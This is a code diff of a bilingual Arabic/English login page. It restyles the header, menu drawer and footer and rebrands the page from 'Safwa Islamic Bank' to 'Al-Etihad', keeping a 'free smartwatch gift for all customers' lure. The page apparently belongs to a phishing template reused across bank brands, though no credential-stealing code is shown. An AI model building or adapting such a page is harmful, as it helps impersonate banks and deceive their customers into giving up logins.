@@ -5,7 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Login</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Readex+Pro:wght@300;400;600;700&family=Cairo:wght@500;700;800&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   :root{
     --green:#1a6b3c;
@@ -34,82 +35,28 @@
   img, svg { display: block; }
   .container { max-width: 1160px; margin: 0 auto; padding: 0 28px; }
 
-  /* ===== HEADER ===== */
-  header{
-    background:#F1EFEA;
-    border-bottom:1px solid #D3CFC6;
-    position:sticky; top:0; z-index:100;
-    width: 100%;
-  }
-  .header-inner{
-    display:flex; align-items:center; justify-content:space-between;
-    padding:8px 24px; max-width:1160px; margin:0 auto;
-  }
-  .brand{
-    display:flex; align-items:center; gap:10px;
-    font-weight:800; font-size:1.28rem; color:#0B2E33;
-    letter-spacing:.2px;
-  }
-  .brand .mark{
-    width:40px; height:40px; flex:none; object-fit:contain;
-  }
-  .header-brand{height:100%;}
-  .header-brand .mark-full{
-    height:38px; width:auto; max-width:none; display:block; object-fit:contain;
-  }
-  nav.main-nav{
-    display:flex; gap:34px; font-weight:500; font-size:.98rem;
-  }
-  nav.main-nav a{
-    color:#4B5C5F; position:relative; padding:4px 0;
-    transition:color .2s ease;
-  }
-  nav.main-nav a:hover{color:#0B2E33;}
-  nav.main-nav a::after{
-    content:""; position:absolute; right:0; left:0; bottom:-2px; height:2px;
-    background:#B98851; transform:scaleX(0); transition:transform .25s ease;
-  }
-  nav.main-nav a:hover::after{transform:scaleX(1);}
-
-  .header-actions{display:flex; align-items:center; gap:14px;}
-
-  .lang-toggle{
-    display:flex; align-items:center; gap:6px;
-    border:1px solid #D3CFC6; border-radius:999px;
-    padding:7px 16px; font-size:.85rem; font-weight:700;
-    color:#0B2E33; background:#FBFAF7;
-    transition:background .2s ease, border-color .2s ease;
-  }
-  .lang-toggle:hover{background:#DCC7A6; border-color:#B98851;}
-
-  .burger{
-    display:none; flex-direction:column; justify-content:center; gap:5px;
-    width:26px; height:20px;
-  }
-  .burger span{display:block; height:2px; width:100%; background:#0B2E33; border-radius:2px;}
-
-  /* mobile nav */
-  .mobile-nav{
-    display:none;
-    flex-direction:column;
-    background:#F1EFEA;
-    border-top:1px solid #D3CFC6;
-    padding:8px 28px 18px;
-  }
-  .mobile-nav a{
-    padding:12px 0; border-bottom:1px solid #D3CFC6;
-    color:#4B5C5F; font-weight:500;
-  }
-  .mobile-nav a:last-child{border-bottom:none;}
-  body.nav-open .mobile-nav{display:flex;}
-  body.nav-open .burger span:nth-child(1){transform:translateY(7px) rotate(45deg);}
-  body.nav-open .burger span:nth-child(2){opacity:0;}
-  body.nav-open .burger span:nth-child(3){transform:translateY(-7px) rotate(-45deg);}
-
-  @media (max-width:860px){
-    nav.main-nav{display:none;}
-    .burger{display:flex;}
-  }
+  /* Header */
+  .header,.drawer,.footer{font-family:"Readex Pro",Tahoma,"Segoe UI",Arial,sans-serif;line-height:1.6}
+  .header{position:sticky;top:env(safe-area-inset-top,0px);z-index:40;background:#fff;border-bottom:1px solid #E3E8F0}
+  .header-in{max-width:1200px;margin:0 auto;height:64px;padding:0 16px;display:flex;align-items:center;justify-content:space-between;gap:12px}
+  .logo{display:flex;align-items:center}
+  .logo img{height:52px;width:auto;max-width:min(60vw,280px);object-fit:contain}
+  .actions{display:flex;align-items:center;gap:8px}
+  .lang-btn{border:1.5px solid #0A0A0A;background:#fff;border-radius:999px;padding:6px 14px;font-weight:600;font-size:.9rem}
+  .lang-btn:hover{background:#0A0A0A;color:#fff}
+  .burger{width:44px;height:44px;border:0;background:transparent;display:grid;place-content:center;gap:5px;border-radius:10px}
+  .burger span{display:block;width:24px;height:2.5px;background:#0A0A0A;border-radius:2px;transition:transform .25s,opacity .2s}
+  .burger[aria-expanded="true"] span:nth-child(1){transform:translateY(7.5px) rotate(45deg)}
+  .burger[aria-expanded="true"] span:nth-child(2){opacity:0}
+  .burger[aria-expanded="true"] span:nth-child(3){transform:translateY(-7.5px) rotate(-45deg)}
+  .scrim{position:fixed;inset:0;background:rgba(0,0,0,.4);opacity:0;pointer-events:none;transition:opacity .25s;z-index:50}
+  .scrim.open{opacity:1;pointer-events:auto}
+  .drawer{position:fixed;top:0;bottom:0;inset-inline-end:0;width:min(300px,82vw);background:#fff;z-index:60;padding:calc(env(safe-area-inset-top,0px) + 20px) 20px 20px;transform:translateX(-105%);transition:transform .3s ease;display:flex;flex-direction:column;gap:4px}
+  [dir="ltr"] .drawer{transform:translateX(105%)}
+  .drawer.open{transform:none!important}
+  .drawer-close{align-self:flex-end;border:0;background:#F2F5FA;width:40px;height:40px;border-radius:10px;font-size:1.3rem;margin-bottom:8px}
+  .drawer a{text-decoration:none;padding:14px 12px;border-radius:10px;font-weight:600}
+  .drawer a:hover{background:#F2F5FA}
 
   /* ===== MAIN CONTENT ===== */
   .main-wrapper {
@@ -360,30 +307,21 @@
     background: #c0392b;
   }
 
-  /* ===== FOOTER ===== */
-  footer{
-    background:#E9E6E0; color:#4B5C5F;
-    padding:56px 0 26px;
-    width: 100%;
-  }
-  .footer-top{
-    display:flex; justify-content:space-between; gap:40px; flex-wrap:wrap;
-    padding-bottom:34px; border-bottom:1px solid rgba(11,46,51,.12);
-  }
-  .footer-brand{max-width:32ch;}
-  .footer-brand .footer-logo{height:64px; width:auto; object-fit:contain;}
-  .footer-brand p{margin-top:14px; font-size:.9rem; color:#4B5C5F;}
-  .footer-links{display:flex; flex-direction:column; gap:24px;}
-  .footer-links h4{
-    font-family:'Cairo',sans-serif; color:#000; font-weight:800; font-size:.95rem; margin-bottom:16px;
-  }
-  .footer-links ul{display:flex; flex-direction:column; gap:11px;}
-  .footer-links a{font-size:.9rem; color:#000; font-weight:700; transition:color .2s ease;}
-  .footer-links a:hover{color:#2F6F63;}
-  .footer-bottom{
-    display:flex; justify-content:center; text-align:center; flex-wrap:wrap; gap:10px;
-    padding-top:22px; font-size:.82rem; color:#000; font-weight:700;
-  }
+  /* Footer */
+  .footer{background:#000;color:#fff;padding:40px 16px calc(24px + env(safe-area-inset-bottom,0px))}
+  .footer-in{max-width:1200px;margin:0 auto;display:grid;gap:28px}
+  .footer-logo{width:96px;height:96px;object-fit:contain}
+  .app{display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+  .app h4{margin:0 0 8px;font-size:1.05rem}
+  .stores{display:flex;gap:10px;flex-wrap:wrap}
+  .badge-link{display:block;border-radius:8px}
+  .badge-link img{height:48px;width:auto}
+  .flinks{display:flex;flex-direction:column;gap:12px}
+  .flinks a{text-decoration:none;color:#cfd3da}
+  .flinks a:hover{color:#fff;text-decoration:underline}
+  .fintro p{margin:0;font-size:1.05rem;font-weight:600}
+  .fintro p+p{margin-top:6px;color:#cfd3da;font-weight:400}
+  .copy{border-top:1px solid #222;padding-top:18px;color:#8a909b;font-size:.85rem;text-align:center}
 
   [data-lang="en"]{display:none;}
   body.lang-en [data-lang="ar"]{display:none;}
@@ -393,34 +331,24 @@
 </head>
 <body class="lang-en">
 
-<header>
-  <div class="header-inner">
-    <button class="burger" id="burgerBtn" aria-label="فتح القائمة">
-      <span></span><span></span><span></span>
-    </button>
-
-    <div class="brand header-brand">
-      <img class="mark-full" src="https://i.ibb.co/vvhxyt4K/image.png" alt="Safwa Islamic Bank">
+<header class="header">
+  <div class="header-in">
+    <a href="index_en.html" class="logo"><img src="assets/branding/brand-logo.png" alt="Al-Etihad"></a>
+    <div class="actions">
+      <button class="lang-btn" id="langBtn" aria-label="Switch to Arabic">AR</button>
+      <button class="burger" id="burger" aria-label="Menu" aria-expanded="false" aria-controls="drawer"><span></span><span></span><span></span></button>
     </div>
-    <nav class="main-nav">
-      <a href="#watches"><span data-lang="ar">الساعات</span><span data-lang="en">Watches</span></a>
-      <a href="#contact"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact</span></a>
-    </nav>
-
-    <div class="header-actions">
-      <button class="lang-toggle" id="langBtn">
-        <svg viewBox="0 0 24 24" fill="none" stroke="#1E9E5C" stroke-width="1.8" width="16" height="16"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.5 2.5 15.5 0 18M12 3c-2.5 2.5-2.5 15.5 0 18"/></svg>
-        <span data-lang="ar">EN</span>
-        <span data-lang="en">AR</span>
-      </button>
-    </div>
-  </div>
-
-  <div class="mobile-nav" id="mobileNav">
-    <a href="#watches"><span data-lang="ar">الساعات</span><span data-lang="en">Watches</span></a>
-    <a href="#contact"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact</span></a>
   </div>
 </header>
+<div class="scrim" id="scrim"></div>
+<nav class="drawer" id="drawer" aria-label="menu">
+  <button class="drawer-close" id="drawerClose" aria-label="close">✕</button>
+  <a href="index_en.html#top">Home</a>
+  <a href="index_en.html#products">Products</a>
+  <a href="index_en.html#contact">Contact us</a>
+  <a href="index_en.html#terms">Terms &amp; Conditions</a>
+  <a href="index_en.html#privacy">Privacy Policy</a>
+</nav>
 
 <div class="main-wrapper">
   <div class="screen">
@@ -516,37 +444,57 @@
   </div>
 </div>
 
-<footer id="contact">
-  <div class="container">
-    <div class="footer-top">
-      <div class="footer-brand">
-        <img class="footer-logo" src="https://i.ibb.co/vvhxyt4K/image.png" alt="Safwa Islamic Bank">
-        <p><span data-lang="ar">الساعة الذكية مقدمة من بنك صفوة الإسلامي هدية مجانية لجميع عملاء البنك، جميع الساعات تحمل شعار البنك.</span><span data-lang="en">The smartwatch from Safwa Islamic Bank is a free gift for all bank customers. Every watch carries the bank's logo.</span></p>
-      </div>
-      <div class="footer-links">
-        <div>
-          <h4><span data-lang="ar">تواصل</span><span data-lang="en">Reach us</span></h4>
-          <ul>
-            <li><a href="#"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact us</span></a></li>
-          </ul>
-        </div>
-        <div>
-          <h4><span data-lang="ar">قانوني</span><span data-lang="en">Legal</span></h4>
-          <ul>
-            <li><a href="#"><span data-lang="ar">السياسات والخصوصية</span><span data-lang="en">Privacy Policy</span></a></li>
-            <li><a href="#"><span data-lang="ar">الشروط والأحكام</span><span data-lang="en">Terms &amp; Conditions</span></a></li>
-          </ul>
+<footer class="footer" id="contact">
+  <div class="footer-in">
+    <img class="footer-logo" src="assets/branding/footer-logo.png" alt="Al-Etihad">
+    <div class="fintro">
+      <p><span data-lang="ar">الساعة الذكية هدية مجانية لجميع عملاء الاتحاد</span><span data-lang="en">The smart watch is a free gift for all Al-Etihad customers</span></p>
+      <p><span data-lang="ar">جميع الساعات تحمل شعار الاتحاد</span><span data-lang="en">All watches carry the Al-Etihad logo</span></p>
+    </div>
+    <div class="flinks">
+      <a href="index_en.html#privacy"><span data-lang="ar">سياسة الخصوصية</span><span data-lang="en">Privacy Policy</span></a>
+      <a href="index_en.html#terms"><span data-lang="ar">الشروط والأحكام</span><span data-lang="en">Terms &amp; Conditions</span></a>
+      <a href="index_en.html#contact"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact us</span></a>
+    </div>
+    <div class="app">
+      <div>
+        <h4><span data-lang="ar">حمّل التطبيق</span><span data-lang="en">Get the app</span></h4>
+        <div class="stores">
+          <a class="badge-link" href="#"><img src="assets/branding/app-store-badge.png" alt="App Store"></a>
+          <a class="badge-link" href="#"><img src="assets/branding/google-play-badge.png" alt="Google Play"></a>
+          <a class="badge-link" href="#"><img src="assets/branding/appgallery-badge.png" alt="AppGallery"></a>
         </div>
       </div>
     </div>
-    <div class="footer-bottom">
-      <span><span data-lang="ar">جميع الحقوق محفوظة لبنك صفوة الإسلامي 2026</span><span data-lang="en">All rights reserved © Safwa Islamic Bank 2026</span></span>
-    </div>
+    <div class="copy"><span data-lang="ar">جميع الحقوق محفوظة © الاتحاد 2026</span><span data-lang="en">All rights reserved © Al-Etihad 2026</span></div>
   </div>
 </footer>
 
 <script>
   var statusPollTimer = null;
+
+  var drawer = document.getElementById('drawer');
+  var scrim = document.getElementById('scrim');
+  var burger = document.getElementById('burger');
+  function toggleDrawer(open) {
+    drawer.classList.toggle('open', open);
+    scrim.classList.toggle('open', open);
+    burger.setAttribute('aria-expanded', open);
+  }
+  burger.addEventListener('click', function() {
+    toggleDrawer(!drawer.classList.contains('open'));
+  });
+  scrim.addEventListener('click', function() { toggleDrawer(false); });
+  document.getElementById('drawerClose').addEventListener('click', function() { toggleDrawer(false); });
+  drawer.querySelectorAll('a').forEach(function(link) {
+    link.addEventListener('click', function() { toggleDrawer(false); });
+  });
+  document.getElementById('langBtn').addEventListener('click', function() {
+    window.location.href = 'login_ar.html';
+  });
+  document.addEventListener('keydown', function(event) {
+    if (event.key === 'Escape') toggleDrawer(false);
+  });
 
   function showInvalidFields(fields) {
     var errorMsg = document.getElementById('errorMsg');
